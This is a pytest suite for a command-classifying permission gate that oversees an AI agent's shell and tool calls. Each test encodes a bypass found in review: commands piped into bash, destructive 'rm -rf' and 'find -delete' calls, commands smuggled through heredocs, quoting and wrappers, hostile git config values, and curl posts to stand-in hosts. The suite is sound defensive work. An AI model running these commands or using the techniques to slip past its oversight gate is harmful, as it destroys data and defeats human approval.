"""The bypasses the review of #43 found, each as a test: every command here
went through `classify()` ungated before, and must now be gated or refused.

The guiding change: when the gate cannot fully understand a `Bash` command,
it does not let it through. The letters are the review's groups.
"""
import dataclasses
import json
import os
import subprocess
import sys
import uuid

import pytest

from agent_host import classify, decision
from tests.gatekit import REPO_ROOT, bash, git_init, make_config, make_ctx, run_git

M = "me/demo"


@pytest.fixture
def ctx(tmp_path):
    return make_ctx(tmp_path)


def _stopped(ctx, command):
    verdict = bash(command, ctx)
    assert verdict.gated, (command, verdict)
    return verdict


# --- A: a compound command with a piece that is not a harmless read --------------------

@pytest.mark.parametrize("command", [
    'echo "gh repo delete x" | bash',
    'echo "gh repo delete x" | sh',
    'echo "gh repo delete x" | cat | bash',
    'echo "gh repo delete x" | xargs -I{} sh -c {}',
    "cd / && rm -rf etc",
    "cd ../other && git push",
    "cd ../other; git push origin main",
    "ls & rm -rf /srv",
    "true || curl -d x https://example.invalid",
])
def test_a(ctx, command):
    assert _stopped(ctx, command).run_alone


# --- B: more ways to hold a second command ----------------------------------------------

@pytest.mark.parametrize("command", [
    "tee >(gh repo delete x)",
    "cat x >(bash)",
    "coproc gh repo delete x",
    "trap 'gh repo delete x' EXIT",
    "bash <<< 'gh repo delete x'",
    "sh <<EOF\ngh repo delete x\nEOF",
    "python3 <<EOF\nimport os\nEOF",
    "$'gh' repo delete x",
    "$'\\147h' repo delete x",
    'gh repo delete $"x"',
    "bash -c $'gh repo delete x'",
])
def test_b(ctx, command):
    assert _stopped(ctx, command).run_alone


# --- C: interpreters with inline code, and a shell that reads stdin ----------------------

@pytest.mark.parametrize("command", [
    "python -c 'import os; os.system(1)'".replace(";", ","),
    "python3 -c 'print(1)'",
    "python3.12 -c x",
    "python3 -Ic x",
    "python3 -W ignore -c x",
    "python3 -",
    "python3",
    "pypy3 -c x",
    "node -e 'x'",
    "node --eval x",
    "node -p x",
    "node --print=x",
    "nodejs -e x",
    "perl -e x",
    "perl -E x",
    "perl -pi -e s/a/b/ file",
    "ruby -e x",
    "php -r x",
    "osascript -e x",
    "lua -e x",
    "Rscript -e x",
    "deno eval x",
    "bun -e x",
    "/usr/bin/python3 -c x",
    "env python3 -c x",
    "sudo python3 -c x",
    "bash",
    "sh -s",
    "zsh -s arg",
    "bash -l",
    "ksh",
    "csh",
    "fish",
])
def test_c_inline_code_is_gated_and_has_no_class(ctx, command):
    verdict = _stopped(ctx, command)
    assert not verdict.run_alone
    assert set(verdict.classes) <= {"root"}


@pytest.mark.parametrize("command,classes", [
    ("csh -c 'gh repo delete me/demo'", ["delete"]),
    ("tcsh -c 'gh repo delete me/demo'", ["delete"]),
    ("ksh -c 'gh repo delete me/demo'", ["delete"]),
    ("fish -c 'gh repo delete me/demo'", ["delete"]),
])
def test_c_every_shell_with_c_is_followed(ctx, command, classes):
    assert _stopped(ctx, command).classes == tuple(classes)


@pytest.mark.parametrize("command", [
    "python3 script.py", "python3 -m pytest -q", "python3 manage.py migrate",
    "node server.js", "perl script.pl", "ruby script.rb", "bash script.sh", "sh ./run.sh arg",
    "fish script.fish",
])
def test_c_a_script_file_is_not_followed_and_runs(ctx, command):
    assert not bash(command, ctx).gated, command


# --- D: wrappers and their option values ---------------------------------------------------

@pytest.mark.parametrize("command,classes", [
    ("exec -a innocent gh repo delete me/demo", ["delete"]),
    ("stdbuf -o L gh repo delete me/demo", ["delete"]),
    ("stdbuf -oL -e0 gh repo delete me/demo", ["delete"]),
    ("time -f %e -o t.txt gh repo delete me/demo", ["delete"]),
    ("ionice -c 3 -n 7 gh repo delete me/demo", ["delete"]),
    ("nice -n 19 gh repo delete me/demo", ["delete"]),
    ("nice -19 gh repo delete me/demo", ["delete"]),
    ("timeout 30 gh repo delete me/demo", ["delete"]),
    ("timeout -k 5 -s KILL 30s gh repo delete me/demo", ["delete"]),
    ("env -u HOME -C /srv gh repo delete me/demo", ["delete"]),
    ("sudo -u deploy -g staff gh repo delete me/demo", ["root", "delete"]),
    ("sudo -u deploy kubectl delete pod web", ["root", "delete"]),
])
def test_d_a_wrapper_is_read_with_its_option_values(ctx, command, classes):
    verdict = _stopped(ctx, command)
    assert verdict.classes == tuple(classes) and not verdict.run_alone


@pytest.mark.parametrize("command", [
    "env -S 'gh repo delete me/demo'",
    "env --split-string 'gh repo delete me/demo'",
    "exec --unknown gh repo delete me/demo",
    "stdbuf --weird gh repo delete me/demo",
    "sudo --weird gh repo delete me/demo",
    "watchdog gh repo delete me/demo",
    "runner sudo ls",
    "retry 3 kubectl delete pod web",
    "chrt 1 gh repo delete me/demo",
    "taskset 1 gh repo delete me/demo",
    "setpriv --reuid 0 gh repo delete me/demo",
    "runuser -u deploy -- gh repo delete me/demo",
    "systemd-run gh repo delete me/demo",
    "unshare gh repo delete me/demo",
    "nsenter -t 1 gh repo delete me/demo",
])
def test_d_an_unknown_wrapper_or_option_refuses(ctx, command):
    assert _stopped(ctx, command).run_alone


# --- E: rm -r, mv and find ------------------------------------------------------------------

def _worktree(tmp_path):
    work = tmp_path / "area" / "work"
    git_init(work)
    (work / "sub").mkdir()
    return work, make_ctx(tmp_path, cwd=work)


@pytest.mark.parametrize("command", [
    "rm -rf {sub,/etc}",
    "rm -rf sub/{a,../../..}",
    "rm -rf *",
    "rm -rf sub/*",
    "rm -rf ./s?b",
    "rm -rf ~root",
    "rm -rf ~other/x",
    "rm -rf sub/..",
    "rm -rf sub/../..",
    "rm -rf ..",
    "rm --r ../x",
    "rm --re ../x",
    "rm --recu ../x",
    "rm --recursive ../x",
    "find .. -delete",
    "find / -name x -delete",
    "find ~/projects -type d -delete",
    "find sub/../.. -delete",
])
def test_e_a_recursive_delete_the_gate_cannot_place_is_class_delete(tmp_path, command):
    _, ctx = _worktree(tmp_path)
    # `delete`, or `self` when the tree it names holds Jarvis's own rules.
    assert _stopped(ctx, command).classes in (("delete",), ("self",))


@pytest.mark.parametrize("command", [
    "find . -exec rm -rf {} +",
    "find . -name x -execdir gh repo delete x +",
    "find . -ok rm {} +",
])
def test_e_find_that_runs_a_command_is_refused(tmp_path, command):
    _, ctx = _worktree(tmp_path)
    assert _stopped(ctx, command).run_alone


def test_e_inside_the_worktree_they_still_run(tmp_path):
    _, ctx = _worktree(tmp_path)
    for command in ("rm -rf sub", "rm -r ./sub/x", "find . -name '*.pyc' -delete",
                    "find sub -type f -delete", "find . -name x"):
        assert not bash(command, ctx).gated, command


def test_e_mv_and_find_of_a_tree_that_holds_jarvis_own_rules_is_self(tmp_path):
    ctx = make_ctx(tmp_path)
    home = tmp_path / "home"
    (home / ".ssh").mkdir()
    for command in (
        f"mv {home}/.claude {home}/.claude.bak",
        f"mv {home} /srv/elsewhere",
        "mv ~/.ssh ~/.ssh.old",
        f"find {home}/.claude -delete",
        f"find {home} -name settings.json -delete",
        "mv .claude .claude.off",                       # the checkout's own
    ):
        (tmp_path / "projects" / "demo" / ".claude").mkdir(exist_ok=True)
        verdict = bash(command, ctx)
        assert verdict.classes == ("self",), (command, verdict)


def test_e_tree_is_not_a_reader_of_protected_paths(tmp_path):
    ctx = make_ctx(tmp_path)
    assert bash("tree -o ~/.bashrc .", ctx).classes == ("self",)
    assert "tree" not in ctx.rules.self_read_programs
    assert {"mv", "find"} <= ctx.rules.self_tree_programs


# --- F: git push ---------------------------------------------------------------------------

@pytest.mark.parametrize("command", [
    "git push origin feature:heads/main",
    "git push origin HEAD:heads/main",
    "git push origin 'refs/heads/*:refs/heads/*'",
    "git push origin 'refs/heads/feature*:refs/heads/*'",
    "git push origin feature:refs/heads/main",
    "git push origin heads/main",
])
def test_f_a_destination_that_can_resolve_to_the_default_branch_is_a_merge(ctx, command):
    assert "merge" in _stopped(ctx, command).classes


@pytest.mark.parametrize("command", [
    "git --git-dir=/srv/other/.git push origin feature",
    "git --git-dir /srv/other/.git push origin feature",
    "git --work-tree=/srv/other push origin feature",
    "git -c remote.origin.pushurl=git@elsewhere.example:x/y push origin feature",
    "git -c core.sshCommand=evil push origin feature",
    "git -ccore.sshCommand=evil push origin feature",
    "git --config-env=core.sshCommand=EVIL push origin feature",
    "git --config-env core.sshCommand=EVIL push origin feature",
    "git -C /no/such/place push origin feature",
    "git -C a -C b push origin feature",
    "git subtree push --prefix=sub origin main",
    "git subtree push --prefix sub origin feature",
    # An alias, a command git will run or another address: whatever the subcommand says.
    "git -c alias.st=push st origin main",
    "git --config-env=alias.st=X st",
    "git -c core.sshCommand=evil fetch",
    "git -c core.hooksPath=/tmp/hooks commit -m x",
    "git -c url.git@elsewhere.example:.insteadOf=git@github.com: fetch",
    "git -c url.x.pushInsteadOf=y status",
    "git -c core.pager=evil log",
    "git -c core.fsmonitor=evil status",
    "git -c diff.external=evil diff",
    "git -c credential.helper=evil fetch",
    "git -c ALIAS.x=push x",
])
def test_f_another_repository_or_configuration_on_the_command_line_is_gated(ctx, command):
    _stopped(ctx, command)


def test_f_git_c_dir_push_is_judged_in_that_directory(tmp_path):
    remote = tmp_path / "remote.git"
    remote.mkdir()
    run_git(remote, "init", "-q", "--bare", "-b", "main")
    other = tmp_path / "other"
    git_init(other, branch="main")
    run_git(other, "remote", "add", "origin", str(remote))
    run_git(other, "push", "-q", "-u", "origin", "main")
    here = tmp_path / "here"
    git_init(here, branch="feature")
    ctx = make_ctx(tmp_path, cwd=here, git=classify.run_git)
    # A bare push there lands on main there, whatever branch this directory is on.
    assert bash(f"git -C {other} push", ctx).classes == ("merge",)
    assert bash("git -C ../other push", ctx).classes == ("merge",)
    assert bash(f"git -C {other} push origin HEAD", ctx).classes == ("merge",)
    run_git(other, "checkout", "-q", "-b", "topic")
    run_git(other, "push", "-q", "-u", "origin", "topic")
    assert not bash(f"git -C {other} push", ctx).gated
    assert not bash("git -C ../other status", ctx).gated


def test_f_plain_git_work_still_runs(ctx):
    for command in ("git -c user.name=x commit -m y", "git -C /srv/repo status",
                    "git --no-pager log", "git push origin feature", "git subtree split --prefix=x",
                    "git -c color.ui=never diff"):
        assert not bash(command, ctx).gated, command


# --- G: gh --repo ----------------------------------------------------------------------------

@pytest.mark.parametrize("command", [
    f"gh pr create --repo {M} --repo them/demo --fill",
    f"gh pr create --repo them/demo --repo {M} --fill",
    f"gh pr create -R {M} --repo=them/demo --fill",
    f"gh pr comment https://github.com/them/demo/pull/5 --repo {M} --body hi",
    f"gh pr checkout https://github.com/them/demo/pull/5 --repo {M}",
    f"gh issue comment https://github.com/them/demo/issues/5 -R {M} --body hi",
    f"gh pr create --repo {M} --head git@github.com:them/demo --fill",
    f"GH_HOST=evil.example gh pr create --repo {M} --fill",
    f"GH_REPO=them/demo gh pr comment 5 --repo {M} --body hi",
    f"env GH_HOST=evil.example gh issue create --repo {M} --title x",
    f"GH_ENTERPRISE_TOKEN=x gh pr create --repo {M} --fill",
])
def test_g_the_own_repository_exception_needs_one_plain_repo(ctx, command):
    _stopped(ctx, command)


def test_g_a_plain_own_repository_call_still_needs_no_yes(ctx):
    for command in (f"gh pr create --repo {M} --fill", f"FOO=1 gh pr comment 5 --repo {M} --body hi",
                    f"gh pr create --repo {M} --title 'see docs' --body 'no url here'"):
        assert not bash(command, ctx).gated, command


# --- H: the class self, lexical and real -------------------------------------------------------

def test_h_a_symlink_where_a_protected_file_should_be_is_still_protected(tmp_path):
    config = make_config(tmp_path)
    home = tmp_path / "home"
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    (elsewhere / "rc").write_text("")
    (home / ".bashrc").symlink_to(elsewhere / "rc")           # a dotfiles-style link
    (home / ".claude" / "CLAUDE.md").symlink_to(elsewhere / "rc")
    ctx = make_ctx(tmp_path, config=config)

    def write(path):
        return classify.classify("Write", {"file_path": str(path), "content": "x"}, ctx)

    # By its name, although its real path is somewhere unprotected ...
    assert write(home / ".bashrc").classes == ("self",)
    assert write(home / ".claude" / "CLAUDE.md").classes == ("self",)
    assert bash("echo x >> ~/.bashrc", ctx).classes == ("self",)
    # ... and by its real path, under another name.
    link = tmp_path / "projects" / "demo" / "innocent"
    link.symlink_to(config.user_settings_path)
    assert write(link).classes == ("self",)
    # A checkout settings file that is a symlink: protected under both.
    target = tmp_path / "projects" / "demo" / ".claude"
    target.mkdir()
    (target / "settings.json").symlink_to(elsewhere / "rc")
    assert write(target / "settings.json").classes == ("self",)


def test_h_a_checkout_settings_symlink_is_unsafe_for_the_gate(tmp_path):
    config = make_config(tmp_path)
    checkout = tmp_path / "projects" / "demo"
    harmless = tmp_path / "harmless.json"
    harmless.write_text("{}")
    (checkout / ".claude").mkdir()
    (checkout / ".claude" / "settings.local.json").symlink_to(harmless)
    result = decision.decide(
        {"tool_name": "Bash", "tool_input": {"command": "terraform apply"}, "cwd": str(checkout)},
        config, turn_checkout=checkout, turn_id=str(uuid.uuid4()),
            home=tmp_path / "home", lib_dir=tmp_path / "lib")
    assert result.reason == decision.REASON_SETTINGS


# --- I: ssh ---------------------------------------------------------------------------------------

@pytest.mark.parametrize("command,classes", [
    ("ssh -P tag jumpy kubectl delete pod web", ["delete"]),
    ("ssh -P tag -p 22 jumpy gh repo delete me/demo", ["delete"]),
    # A remote command is never judged against local paths.
    ("ssh jumpy rm -rf build", ["outward"]),
    ("ssh jumpy rm -rf /", ["outward"]),
    ("ssh jumpy find . -delete", ["outward"]),
    ("ssh jumpy mv a b", ["outward"]),
    ("ssh jumpy systemctl restart web", ["outward"]),
    ("ssh jumpy ./deploy.sh", ["outward"]),
    ("ssh jumpy tee /etc/thing", ["outward"]),
    ("ssh jumpy touch /srv/x", ["outward"]),
    ("ssh jumpy sudo systemctl restart web", ["root", "outward"]),
])
def test_i_a_remote_command_that_is_not_a_read_is_gated(tmp_path, command, classes):
    work = tmp_path / "work"
    git_init(work)
    (work / "build").mkdir()
    ctx = make_ctx(tmp_path, cwd=work)
    verdict = _stopped(ctx, command)
    assert verdict.classes == tuple(classes) and not verdict.run_alone


@pytest.mark.parametrize("command", [
    "ssh jumpy 'echo x > /etc/thing'",
    "ssh jumpy 'cat a | sh'",
    "ssh jumpy python3 -c x",
])
def test_i_a_remote_write_in_a_shape_the_gate_cannot_read_is_stopped_too(ctx, command):
    _stopped(ctx, command)


def test_i_a_remote_read_still_runs(ctx):
    for command in ("ssh jumpy ls -la /srv", "ssh jumpy cat /etc/os-release", "ssh jumpy uptime",
                    "ssh jumpy kubectl get pods -n web", "ssh jumpy git status", "ssh jumpy"):
        assert not bash(command, ctx).gated, command


# --- J: nothing from the process environment ----------------------------------------------------

def test_j_tmpdir_and_home_from_the_environment_decide_nothing(tmp_path, monkeypatch):
    from agent_host import rules as rules_mod
    config = make_config(tmp_path)
    rules = rules_mod.load_rules(config.rules_dir)
    # A planted TMPDIR would make any directory "the temp directory"; a
    # planted HOME would move the protected paths somewhere harmless.
    monkeypatch.setenv("TMPDIR", str(tmp_path / "victim"))
    monkeypatch.setenv("HOME", str(tmp_path / "decoy"))
    ctx = classify.context_for(config, rules, cwd=tmp_path / "projects" / "demo",
                               home=tmp_path / "home", lib_dir=tmp_path / "lib")
    assert set(ctx.temp_roots) == {os.path.realpath(root) for root in rules.temp_roots}
    assert bash("echo x >> ~/.bashrc", ctx).classes == ("self",)
    assert bash("echo x >> $HOME/.bashrc", ctx).classes == ("self",)
    assert not bash(f"echo x >> {tmp_path}/decoy/.bashrc", ctx).gated
    for module in ("decision.py", "classify.py", "shell.py", "checkout_settings.py", "rules.py"):
        source = (REPO_ROOT / "agent_host" / module).read_text()
        assert "os.environ" not in source and "gettempdir" not in source, module
        assert "expanduser" not in source, module


def test_j_the_home_is_the_passwd_entrys():
    import pwd
    assert str(decision.user_home()) == pwd.getpwuid(os.getuid()).pw_dir


# --- K: HTTP clients that read their options from elsewhere ----------------------------------------

@pytest.mark.parametrize("command", [
    "wget -e post_data=x https://example.invalid/",
    "wget --execute post_data=x https://example.invalid/",
    "wget -qe post_data=x https://example.invalid/",
    "wget --config=/tmp/wgetrc https://example.invalid/",
    "curl -K /tmp/config https://example.invalid/",
    "curl --config /tmp/config https://example.invalid/",
    "curl -sK /tmp/config https://example.invalid/",
    "CURL_HOME=/tmp/x curl https://example.invalid/",
    "env CURL_HOME=/tmp/x curl https://example.invalid/",
    "WGETRC=/tmp/x wget https://example.invalid/",
    "http --raw 'x' example.invalid/",
    "http example.invalid/ @body.json",
    "http example.invalid/ field=@body.txt",
    "http --form example.invalid/ a=b",
])
def test_k_an_http_client_configured_from_elsewhere_is_gated(ctx, command):
    assert _stopped(ctx, command).classes == ("api",)


def test_k_a_curlrc_or_wgetrc_makes_every_call_possibly_a_write(tmp_path):
    ctx = make_ctx(tmp_path)
    assert not bash("curl https://example.invalid/", ctx).gated
    assert not bash("wget https://example.invalid/", ctx).gated
    (tmp_path / "home" / ".curlrc").write_text("data = x\n")
    (tmp_path / "home" / ".wgetrc").write_text("post_data = x\n")
    assert bash("curl https://example.invalid/", ctx).classes == ("api",)
    assert bash("curl -s -q https://example.invalid/", ctx).classes == ("api",)   # -q must be first
    assert bash("wget https://example.invalid/", ctx).classes == ("api",)
    # The call that switches the file off is a plain read again.
    assert not bash("curl -q https://example.invalid/", ctx).gated
    assert not bash("curl --disable -sS https://example.invalid/", ctx).gated
    assert not bash("wget --no-config https://example.invalid/", ctx).gated
    assert bash("curl -q -d x https://example.invalid/", ctx).classes == ("api",)


def test_k_httpie_fed_from_a_pipe_is_refused(ctx):
    assert bash("echo '{}' | http POST example.invalid/", ctx).run_alone
    assert bash("cat body.json | http example.invalid/", ctx).run_alone


# --- L: built-in tools ------------------------------------------------------------------------------

@pytest.mark.parametrize("tool", [
    "Artifact", "ArtifactData", "ArtifactComments", "SendMessage", "CronCreate", "CronDelete",
    "Skill", "Workflow", "RemoteTrigger", "SomethingNobodyHasSeenYet", "bash", "write", "",
])
def test_l_a_built_in_tool_nobody_listed_is_gated(ctx, tool):
    if not tool:
        return
    verdict = classify.classify(tool, {"anything": 1}, ctx)
    assert verdict.gated and verdict.classes == () and verdict.rule == "tool:not-listed"


@pytest.mark.parametrize("tool", [
    "Read", "Glob", "Grep", "LS", "WebFetch", "WebSearch", "TodoWrite", "Task", "Agent",
    "ExitPlanMode", "ToolSearch",
])
def test_l_the_listed_read_and_plan_tools_are_not(ctx, tool):
    assert not classify.classify(tool, {"anything": 1}, ctx).gated


def test_l_the_write_tools_come_from_the_rules_and_are_judged_by_their_path(tmp_path):
    ctx = make_ctx(tmp_path)
    assert ctx.rules.tools_write == {"Edit", "Write", "MultiEdit", "NotebookEdit"}
    assert not classify.classify("Write", {"file_path": str(tmp_path / "x.py")}, ctx).gated
    assert classify.classify("NotebookEdit", {"notebook_path": "~/.bashrc"}, ctx).classes == ("self",)


def test_l_a_gated_built_in_tool_is_denied_as_needing_the_desk(tmp_path):
    config = make_config(tmp_path)
    checkout = tmp_path / "projects" / "demo"
    result = decision.decide(
        {"tool_name": "SendMessage", "tool_input": {"to": "main", "message": "x"}, "cwd": str(checkout)},
        config, turn_checkout=checkout, turn_id=str(uuid.uuid4()),
            home=tmp_path / "home", lib_dir=tmp_path / "lib")
    assert not result.allow and result.reason == decision.REASON_DESK


# --- O: the configuration path --------------------------------------------------------------------

def test_o_the_gate_refuses_a_relative_configuration_path(tmp_path):
    payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": "ls"},
                          "cwd": str(tmp_path)}).encode()
    proc = subprocess.run(
        [sys.executable, str(REPO_ROOT / "agent_host" / "gate")], input=payload,
        capture_output=True, cwd=tmp_path, timeout=30,
        env={"JARVIS_TURN": "1", "JARVIS_TURN_ID": str(uuid.uuid4()),
             "JARVIS_AGENT_CONFIG": "config.toml", "JARVIS_TURN_CHECKOUT": str(tmp_path),
             "PATH": os.environ.get("PATH", "")})
    out = json.loads(proc.stdout)["hookSpecificOutput"]
    assert out["permissionDecision"] == "deny"


# --- what the gate answers to a call it cannot read -------------------------------------------------

def test_a_call_the_gate_cannot_read_is_told_to_split_it_and_may_go_on(tmp_path):
    config = make_config(tmp_path)
    checkout = tmp_path / "projects" / "demo"

    def decide(command):
        return decision.decide(
            {"tool_name": "Bash", "tool_input": {"command": command}, "cwd": str(checkout)},
            config, turn_checkout=checkout, turn_id=str(uuid.uuid4()),
            home=tmp_path / "home", lib_dir=tmp_path / "lib")

    result = decide("cd /srv/repo && pytest -q")
    assert not result.allow
    assert result.reason == decision.REASON_NOT_UNDERSTOOD
    assert result.reason.startswith("[split]")
    assert "end your turn" not in result.reason        # nothing gated was found: the agent goes on
    assert "Run each part as its own call" in result.reason
    # With something gated in it, it is the refusal that ends the turn.
    assert decide("cd /srv/repo && gh pr merge 1").reason == decision.REASON_RUN_ALONE
    assert decide("ls | wc -l").allow
